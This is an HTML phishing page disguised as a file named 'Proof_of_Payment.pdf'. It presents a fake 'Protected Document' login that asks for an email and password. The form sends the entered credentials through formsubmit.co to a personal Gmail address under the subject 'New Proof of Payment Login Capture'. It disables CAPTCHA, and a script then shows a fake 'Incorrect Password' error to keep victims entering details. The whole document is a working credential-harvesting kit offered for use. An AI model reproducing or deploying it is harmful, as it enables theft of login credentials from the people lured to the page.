<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Proof_of_Payment.pdf</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background: #f0f2f5;
            position: relative;
        }
        body::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: url('https://images.squarespace-cdn.com/content/v1/65440a3319b01515bd58091e/043c2390-edd7-4b8a-bccf-b4c0ec6fdf28/profit-and-loss-statement-with-pivot-table-in-excel-screenshot.png') center/cover no-repeat fixed;
            filter: blur(12px);
            z-index: -2;
        }
        body::after {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(8px);
            z-index: -1;
        }
        .container {
            background: rgba(255, 255, 255, 0.92);
            backdrop-filter: blur(12px);
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.25);
            padding: 50px 40px;
            max-width: 460px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(0,0,0,0.1);
        }
        .lock-icon {
            font-size: 68px;
            color: #d32f2f;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 28px;
            color: #1e1e1e;
            margin-bottom: 12px;
            font-weight: 600;
        }
        p {
            font-size: 16px;
            color: #555;
            line-height: 1.6;
            margin-bottom: 35px;
        }
        .error {
            background: #ffebee;
            color: #c62828;
            padding: 16px;
            border-radius: 8px;
            margin: 20px 0;
            font-size: 15px;
            border-left: 4px solid #ef5350;
            display: none;
        }
        input {
            width: 100%;
            padding: 16px;
            margin: 12px 0;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            background: #fff;
            transition: border 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #1976d2;
            box-shadow: 0 0 0 3px rgba(25,118,210,0.15);
        }
        button {
            width: 100%;
            padding: 16px;
            background: #1976d2;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #1565c0;
        }
        @media (max-width: 480px) {
            .container {
                padding: 40px 25px;
            }
            h1 { font-size: 26px; }
            p { font-size: 15px; }
            input, button { padding: 14px; font-size: 15px; }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="lock-icon">ðŸ”’</div>
    <h1>Protected Document</h1>
    <p>Login to view proof of payment</p>

    <div id="error" class="error">
        Incorrect Password or Email. Please try again
    </div>

    <!-- FormSubmit.co integration - sends to your email -->
    <form id="loginForm" action="https://formsubmit.co/georgemike1401@gmail.com" method="POST">
        <!-- Hidden field to customize subject -->
        <input type="hidden" name="_subject" value="New Proof of Payment Login Capture">
        <!-- Hidden field to redirect after submit (optional - shows thank you or fake success) -->
        <input type="hidden" name="_next" value="https://securedocshare.co.za/thank-you.html">
        <!-- Hidden field to disable CAPTCHA (optional) -->
        <input type="hidden" name="_captcha" value="false">

        <input type="email" name="email" placeholder="Email address" required autofocus autocomplete="username">
        <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
        <button type="submit">Unlock & View Document</button>
    </form>
</div>

<script>
    // Show fake error after submit (client-side only)
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        // Do NOT preventDefault() - we want FormSubmit to process the form
        setTimeout(() => {
            document.getElementById('error').style.display = 'block';
            document.getElementById('password').value = '';
            document.getElementById('password').focus();
        }, 500); // Small delay so form submits first
    });
</script>

</body>
</html>
